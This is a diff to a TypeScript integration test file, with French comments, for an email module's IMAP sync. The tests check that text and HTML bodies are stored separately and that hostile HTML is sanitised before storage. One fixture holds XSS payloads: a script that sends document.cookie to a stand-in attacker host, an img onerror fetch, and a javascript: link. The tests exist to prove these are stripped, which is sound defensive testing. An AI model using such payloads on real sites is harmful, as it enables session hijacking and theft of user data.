@@ -116,10 +116,40 @@ function construireEmailBrut(input: {
       "MIME-Version: 1.0",
       "Content-Type: text/plain; charset=utf-8",
       "",
-      input.corps,
-      ""
+      input.corps
     ].join("\r\n")
   );
+}
+
+// multipart/alternative avec une partie HTML (contenu potentiellement
+// malveillant, jamais fiable) et, optionnellement, une partie texte —
+// sert à vérifier que ImapSyncJobService sépare bien corpsTexte/corpsHtml
+// et nettoie ce dernier (audit préalable, 2026-09-16).
+function construireEmailHtml(input: {
+  from: string;
+  to: string;
+  subject: string;
+  date: string;
+  messageId: string;
+  corpsHtml: string;
+  corpsTexte?: string;
+}): Buffer {
+  const boundary = "----test-boundary-messagerie-html----";
+  const lignes = [
+    `From: ${input.from}`,
+    `To: ${input.to}`,
+    `Subject: ${input.subject}`,
+    `Date: ${input.date}`,
+    `Message-ID: ${input.messageId}`,
+    "MIME-Version: 1.0",
+    `Content-Type: multipart/alternative; boundary="${boundary}"`,
+    ""
+  ];
+  if (input.corpsTexte !== undefined) {
+    lignes.push(`--${boundary}`, "Content-Type: text/plain; charset=utf-8", "", input.corpsTexte);
+  }
+  lignes.push(`--${boundary}`, "Content-Type: text/html; charset=utf-8", "", input.corpsHtml, `--${boundary}--`, "");
+  return Buffer.from(lignes.join("\r\n"));
 }
 
 function construireEmailAvecPieceJointe(input: {
@@ -553,6 +583,96 @@ describe("Module Messagerie (intégration Postgres réelle, SMTP/IMAP mockés)",
 
       const apres = await boiteMailDedieeService.trouverActive(organisationId);
       expect(apres?.dernierUidSynchronise).toBe(5);
+    });
+
+    // Audit préalable, 2026-09-16 : mailparser expose parsed.text et
+    // parsed.html séparément — ImapSyncJobService doit les stocker chacun
+    // dans sa propre colonne (corpsTexte/corpsHtml), jamais l'un écrasé
+    // par l'autre.
+    it("un message text/plain seul remplit corpsTexte, laisse corpsHtml null", async () => {
+      await configurerBoite();
+      messagesImapAFournir.valeur = [
+        {
+          uid: 1,
+          source: construireEmailBrut({
+            from: "inconnu@example.com",
+            to: "boite-dediee@example.com",
+            subject: "Message texte seul",
+            date: "Mon, 01 Sep 2026 10:00:00 +0200",
+            messageId: "<msg-texte-seul@example.com>",
+            corps: "Un simple message texte."
+          })
+        }
+      ];
+      const boite = await boiteMailDedieeService.trouverActive(organisationId);
+      if (!boite) throw new Error("Boîte attendue introuvable");
+      await imapSyncJobService.synchroniserBoite(boite);
+
+      const [ligne] = await db.select().from(messageCommunication).where(eq(messageCommunication.organisationId, organisationId));
+      expect(ligne?.corpsTexte).toBe("Un simple message texte.");
+      expect(ligne?.corpsHtml).toBeNull();
+    });
+
+    it("un message HTML malveillant est nettoyé avant stockage — script/onerror/javascript: supprimés, mise en forme conservée", async () => {
+      await configurerBoite();
+      messagesImapAFournir.valeur = [
+        {
+          uid: 1,
+          source: construireEmailHtml({
+            from: "inconnu@example.com",
+            to: "boite-dediee@example.com",
+            subject: "Message HTML malveillant",
+            date: "Mon, 01 Sep 2026 10:00:00 +0200",
+            messageId: "<msg-html-malveillant@example.com>",
+            corpsHtml:
+              '<p>Bonjour <b>Jimmy</b>, <a href="https://example.com/quittance">voici votre quittance</a>.</p>' +
+              '<script>fetch("https://malveillant.example.com/vol?c=" + document.cookie)</script>' +
+              '<img src="x" onerror="fetch(\'https://malveillant.example.com/pixel\')" />' +
+              '<a href="javascript:alert(1)">cliquez ici</a>'
+          })
+        }
+      ];
+      const boite = await boiteMailDedieeService.trouverActive(organisationId);
+      if (!boite) throw new Error("Boîte attendue introuvable");
+      await imapSyncJobService.synchroniserBoite(boite);
+
+      const [ligne] = await db.select().from(messageCommunication).where(eq(messageCommunication.organisationId, organisationId));
+      // Aucune trace du contenu dangereux, sous quelque forme que ce soit.
+      expect(ligne?.corpsHtml).not.toContain("<script");
+      expect(ligne?.corpsHtml).not.toContain("onerror");
+      expect(ligne?.corpsHtml).not.toContain("javascript:");
+      expect(ligne?.corpsHtml).not.toContain("malveillant.example.com");
+      expect(ligne?.corpsHtml).not.toContain("<img");
+      // Mise en forme légitime conservée : gras + lien http(s).
+      expect(ligne?.corpsHtml).toContain("<b>Jimmy</b>");
+      expect(ligne?.corpsHtml).toContain('href="https://example.com/quittance"');
+      expect(ligne?.corpsTexte).toBeNull();
+    });
+
+    it("un message multipart/alternative garde corpsTexte ET corpsHtml séparément (HTML nettoyé)", async () => {
+      await configurerBoite();
+      messagesImapAFournir.valeur = [
+        {
+          uid: 1,
+          source: construireEmailHtml({
+            from: "inconnu@example.com",
+            to: "boite-dediee@example.com",
+            subject: "Message texte + HTML",
+            date: "Mon, 01 Sep 2026 10:00:00 +0200",
+            messageId: "<msg-texte-et-html@example.com>",
+            corpsTexte: "Version texte brut.",
+            corpsHtml: "<p>Version <em>HTML</em>.</p><script>alert(1)</script>"
+          })
+        }
+      ];
+      const boite = await boiteMailDedieeService.trouverActive(organisationId);
+      if (!boite) throw new Error("Boîte attendue introuvable");
+      await imapSyncJobService.synchroniserBoite(boite);
+
+      const [ligne] = await db.select().from(messageCommunication).where(eq(messageCommunication.organisationId, organisationId));
+      expect(ligne?.corpsTexte).toBe("Version texte brut.");
+      expect(ligne?.corpsHtml).toContain("<em>HTML</em>");
+      expect(ligne?.corpsHtml).not.toContain("<script");
     });
 
     it("classe un message reçu d'un garant — symétrique à la classification à l'envoi (fil unifié)", async () => {
